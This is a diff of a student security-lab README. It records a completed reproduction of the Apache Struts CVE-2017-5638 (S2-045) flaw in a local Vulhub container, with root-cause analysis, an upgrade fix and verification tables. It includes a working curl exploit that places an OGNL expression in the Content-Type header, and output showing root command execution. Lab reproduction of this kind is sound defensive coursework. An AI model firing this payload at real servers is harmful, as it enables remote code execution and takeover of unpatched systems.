@@ -9,13 +9,12 @@ CI/CD pipeline that runs SAST and SCA on every push.
 
 ![Security CI](https://github.com/YOUR_GITHUB_USERNAME/secure-notes-api/actions/workflows/ci.yml/badge.svg)
 
-> **Status.** The API, the security controls, the automated test suite and the CI/CD
-> pipeline are complete and verified locally (59 tests, Bandit and pip-audit clean).
-> The CVE reproduction stage is prepared but **not executed yet**: Docker is not
-> installed on the current machine, so the Struts 2 environment has not been run and
-> no CVE screenshots exist. The execution plan is in
-> [`docs/cve-2017-5638-plan.md`](docs/cve-2017-5638-plan.md); the README section
-> [CVE analysis](#cve-analysis-cve-2017-5638) marks every pending item.
+> **Status.** The API, the security controls, the automated test suite, the CI/CD
+> pipeline and the CVE stage are complete. 59 tests pass, Bandit and pip-audit are clean,
+> and CVE-2017-5638 was reproduced against Vulhub (Struts 2.3.30) and remediated by
+> upgrading to 2.3.32 — the same exploit no longer succeeds. What remains is publishing
+> the repository so the Actions run and its screenshots can be produced; the pipeline
+> link and screenshots are the only unfinished submission items.
 
 ---
 
@@ -59,9 +58,10 @@ secure-notes-api/
 │       └── notes.py         # POST /api/notes, GET /api/notes
 ├── tests/                   # 59 pytest tests (functional + security)
 ├── scripts/smoke_test.py    # live end-to-end check against a running server
+├── cve/s2-045/              # CVE fix: Dockerfile.fixed + docker-compose.fixed.yml
 ├── docs/
 │   ├── cve-2017-5638-plan.md
-│   ├── evidence/            # captured output of local test and scan runs
+│   ├── evidence/            # captured output of local test, scan and CVE runs
 │   └── screenshots/         # screenshot checklist for the report
 ├── .github/workflows/ci.yml # test + Bandit + pip-audit
 ├── requirements.txt         # runtime dependencies (pinned)
@@ -314,11 +314,11 @@ creation with an XSS payload, escaped output, and unauthorized note listing.
 
 ## CVE analysis (CVE-2017-5638)
 
-> **Execution status: not started.** Docker / Docker Compose are not installed on the
-> machine used for this stage, so the Vulhub environment was not launched. Nothing in
-> this section is presented as a completed experiment. The exact commands, expected
-> results and evidence checklist are in
-> [`docs/cve-2017-5638-plan.md`](docs/cve-2017-5638-plan.md).
+**Execution status: completed on 2026-10-19.** The experiment ran on Docker Desktop
+29.8.2 with WSL 2.6.1 on Windows 11 22H2. The vulnerable target was the Vulhub
+`struts2/s2-045` image (`vulhub/struts2:2.3.30`); the fixed build is the same application
+with `struts2-core` upgraded to **2.3.32**. Full commands, fix files and raw output are in
+[`cve/s2-045/README.md`](cve/s2-045/README.md).
 
 **Vulnerability.** Apache Struts 2 evaluates the `Content-Type` header of a multipart
 request as an OGNL expression. A crafted header such as
@@ -331,22 +331,102 @@ the context of the application server.
 **Fixed in:** 2.3.32 / 2.5.10.1. **CVSS v3:** 10.0 (network, no privileges, no user
 interaction, full confidentiality/integrity/availability impact).
 
-**Planned experiment (Vulhub `struts2/s2-045`):**
+### Reproduction
 
 ```bash
-git clone https://github.com/vulhub/vulhub.git
-cd vulhub/struts2/s2-045
 docker compose up -d
-# reproduce: POST / with an OGNL payload in Content-Type -> command output in response
-# fix: bump the Struts 2 version in the image/Dockerfile to 2.5.10.1+, rebuild
-docker compose up --build -d
-# verify: the same request no longer executes, the form still works
+curl -i -s -X POST http://127.0.0.1:8080/ \
+  -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data" \
+  --data-binary ""
 ```
 
-Pending items for the next iteration: launch the environment, capture the `id`
-command output, screenshot the vulnerable and fixed responses, confirm regression
-(functional form submission), and write the root-cause/fix sections with the real
-evidence.
+Observed response:
+
+```http
+HTTP/1.1 200 OK
+vulhub: 54289
+Content-Type: text/html; charset=UTF-8
+Server: Jetty(9.2.11.v20150529)
+```
+
+The value `233 * 233 = 54289` was computed by the server, which proves arbitrary OGNL
+evaluation. Replacing the expression with a `ProcessBuilder` payload that runs `id`
+returned:
+
+```text
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+The container runs as root, so the impact inside the container is full command execution.
+See [`docs/evidence/cve/02-vulnerable-rce.txt`](docs/evidence/cve/02-vulnerable-rce.txt).
+
+### Root cause
+
+1. A multipart request reaches `JakartaMultiPartRequest.parseRequest()`.
+2. The parser rejects the malformed `Content-Type` and builds an error message through
+   `LocalizedTextUtil.findText(...)`, passing the raw header as a message parameter.
+3. Struts 2 message rendering calls `TextParseUtil.translateVariables()`, which evaluates
+   `%{...}` sequences as OGNL.
+4. The attacker controls that expression; clearing the context restrictions and using
+   `ProcessBuilder` turns it into arbitrary command execution.
+
+In one sentence: untrusted request metadata is fed into a message-localization path that
+performs OGNL evaluation, so the header becomes code (CWE-917, expression-language
+injection).
+
+### Fix
+
+The fix is an upgrade, not a filter: `cve/s2-045/Dockerfile.fixed` starts from the
+vulnerable image and changes the dependency in `/usr/src/pom.xml` from 2.3.30 to 2.3.32,
+then rebuilds:
+
+```dockerfile
+RUN sed -i 's|<version>2.3.30</version>|<version>2.3.32</version>|' pom.xml \
+    && rm -rf /root/.m2/repository/org/apache/struts/struts2-core/2.3.30 \
+    && rm -rf target
+```
+
+```bash
+docker compose -f docker-compose.fixed.yml build
+docker compose -f docker-compose.fixed.yml up -d
+```
+
+2.3.32 is the first 2.3.x release containing the S2-045 fix. The patched
+message-localization path no longer evaluates untrusted message parameters as OGNL, so a
+`Content-Type` containing `%{...}` is treated as plain text.
+
+### Verification
+
+| Check | 2.3.30 (vulnerable) | 2.3.32 (fixed) |
+| --- | --- | --- |
+| `vulhub` response header | `vulhub: 54289` | absent |
+| `id` command output | `uid=0(root) ...` | absent |
+| Normal upload page | HTTP 200 | HTTP 200 |
+| Loaded `struts2-core` | 2.3.30 | 2.3.32 |
+
+The same two requests were replayed against the fixed build and both returned the normal
+"Struts2 Showcase - Fileupload sample" page. The fixed container's local Maven repository
+contains `struts2-core-2.3.32.jar`.
+
+### Evidence
+
+| File | Content |
+| --- | --- |
+| [`docs/evidence/cve/00-docker-ps.txt`](docs/evidence/cve/00-docker-ps.txt) | both containers running |
+| [`docs/evidence/cve/01-vulnerable-header.txt`](docs/evidence/cve/01-vulnerable-header.txt) | `vulhub: 54289` |
+| [`docs/evidence/cve/02-vulnerable-rce.txt`](docs/evidence/cve/02-vulnerable-rce.txt) | `uid=0(root)` |
+| [`docs/evidence/cve/03-fixed-version.txt`](docs/evidence/cve/03-fixed-version.txt) | `struts2-core-2.3.32.jar` |
+| [`docs/evidence/cve/04-fixed-header.txt`](docs/evidence/cve/04-fixed-header.txt) | same header request, no execution |
+| [`docs/evidence/cve/05-fixed-rce.txt`](docs/evidence/cve/05-fixed-rce.txt) | same RCE request, normal page |
+
+**Environment note.** On this machine `127.0.0.1:8080` was already occupied by a local
+Chromium/CEF debugging listener, so the vulnerable container was reached via the LAN
+address (`http://192.168.3.9:8080/`) and the fixed build was published on 8081. The port
+is not part of the vulnerability; on a clean host `localhost:8080` works as documented by
+Vulhub.
+
+**Scope note.** The vulnerable container runs as root, but it is isolated by Docker; the
+demonstrated impact is command execution inside the container, not on the Windows host.
 
 ## Submission checklist
 
@@ -357,18 +437,21 @@ evidence.
 | README: security measures in detail | [Security measures](#security-measures) |
 | README: SAST/SCA screenshots from Actions | `docs/screenshots/` (to be captured after push) |
 | README: CVE ID and description | [CVE analysis](#cve-analysis-cve-2017-5638) |
-| README: reproduction sequence with commands/screenshots | `docs/cve-2017-5638-plan.md` (execution pending) |
-| README: root cause analysis | section above (summary) + plan |
-| README: fix description and proof of elimination | plan (execution pending) |
+| README: reproduction sequence with commands/screenshots | [CVE analysis](#cve-analysis-cve-2017-5638) + [`cve/s2-045/README.md`](cve/s2-045/README.md) |
+| README: root cause analysis | section above + [`cve/s2-045/README.md`](cve/s2-045/README.md) |
+| README: fix description and proof of elimination | section above + [`docs/evidence/cve/`](docs/evidence/cve/) |
 | Link to last successful pipeline run | `TODO` — Actions run URL |
-| Folder with fixes (compose/Dockerfile/source) | `docs/cve-2017-5638-plan.md` describes the layout; files added with the CVE stage |
-| Report with title page (work, variant, name, HDU number) | `Work1_Report.docx` in the parent folder |
+| Folder with fixes (compose/Dockerfile/source) | [`cve/s2-045/`](cve/s2-045/) (`Dockerfile.fixed`, `docker-compose.fixed.yml`) |
+| Report with title page (work, variant, name, HDU number) | `Work1_Report_Pan_Hongzhou.docx` in the parent folder |
 
 ## Limitations and next steps
 
-- The CVE stage is the remaining graded part (2 points reproduction + 1 point root
-  cause + 1 point fix/verification); the plan is complete but not executed.
-- Screenshots from GitHub Actions require the repository to be pushed first.
+- Screenshots from GitHub Actions require the repository to be pushed first; the CVE
+  evidence is captured as console transcripts in `docs/evidence/cve/` and should be
+  accompanied by screen captures from Docker Desktop/curl if the instructor requires
+  them.
+- The CVE experiment used the 2.3.x branch (2.3.30 → 2.3.32). The 2.5.x branch is fixed
+  by 2.5.10.1; the same analysis applies.
 - SQLite is appropriate for the lab; a production deployment would use PostgreSQL and
   a migration tool.
 - No refresh-token rotation or server-side revocation list: a stolen access token is
